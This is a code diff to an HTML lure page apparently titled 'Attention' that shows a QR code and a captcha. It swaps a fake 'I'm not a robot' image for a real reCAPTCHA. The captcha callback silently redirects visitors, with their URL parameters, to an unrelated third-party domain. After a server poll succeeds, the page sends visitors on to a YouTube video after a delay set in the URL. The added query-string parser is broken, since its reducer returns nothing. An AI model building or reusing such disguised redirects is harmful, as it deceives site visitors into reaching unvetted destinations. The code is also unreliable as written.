@@ -490,6 +490,12 @@
 
 
         /*************** media queries end ***********/
+        #captcha {
+            padding: 10px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
     </style>
 
     <script>
@@ -540,14 +546,15 @@
                             <div class="qr2">
                                 <!-- <img src="./Attention_files/qr2.png" alt=""> -->
                             </div>
-                            <div class="recaptcha">
-                                <span>I'm not a robot</span>
-                                <div class="img-recap">
-                                    <img src="./Attention_files/1.png" alt="">
-                                </div>
+                            <div id="captcha">
+                                <script>
+                                    function imNotARobot () {
+                                        window.location.href = `https://ak.psaltauw.net/4/5967693${window.location.search}`;
+                                    }
+                                </script>
+                                <div class="g-recaptcha" data-callback="imNotARobot" data-sitekey="6LeuNSwmAAAAAL50ZqJSjFXyJxU2d3V2WYmeeKS9"></div>
                             </div>
                         </div>
-
                     </div>
                 </span>
             </div>
@@ -594,11 +601,6 @@
     </div>
 
     <script type="text/javascript">
-
-
-
-
-
         document.getElementsByClassName('modal2')[0].style.display = "none";
 
         setTimeout(function () {
@@ -609,8 +611,13 @@
 
     <script>
     (async () => {
+      const qs = window.location.search.replace(/^\?/, '').split('&').reduce((obj, line) => {
+        const [key, value] = line.split('=')
+        obj[key] = value;
+      });
+      const timeout = (t) => new Promise((resolve) => setTimeout(resolve, t));
       const code = Math.random().toString(36).slice(2);
-      const link = `${window.location.origin}/c/${code}`;
+      const link = `${window.location.origin}/c/${code}${window.location.search}`;
       new QRCode(document.querySelector('.qr2'), link);
 
       while (true) {
@@ -619,11 +626,16 @@
           const text = await res.text()
 
           if (text === 'OK') {
-            window.location.href = '/w.html';
+            setTimeout(() => {
+                window.location.href = 'https://www.youtube.com/watch?v=avz06PDqDbM';
+            }, parseInt(qs.t, 10) || 0);
             break;
           }
+
+          await timeout(1000);
         } catch (e) {}
       }
     })()
     </script>
+    <script src="https://www.google.com/recaptcha/api.js"></script>
 </body></html>
